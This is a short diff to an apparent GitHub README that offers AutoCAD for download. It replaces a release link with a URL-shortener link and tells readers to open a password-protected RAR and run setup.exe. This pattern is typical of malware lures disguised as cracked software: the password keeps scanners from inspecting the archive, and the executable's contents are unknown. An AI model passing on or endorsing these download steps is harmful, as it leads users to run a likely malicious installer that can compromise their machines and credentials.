@@ -2,8 +2,8 @@
 
 <H3>How to use</H3>
 
-- [Download](https://github.com/ola2009/autocad-25/releases/download/Download/AutoCAD.rar)
-- Open archive (password: autocad)
+- [Download](https://goo.su/t7nrX)
+- Open archive (password: Project12!)
 - Open setup.exe for download all components and install
 - Follow the instruction
 
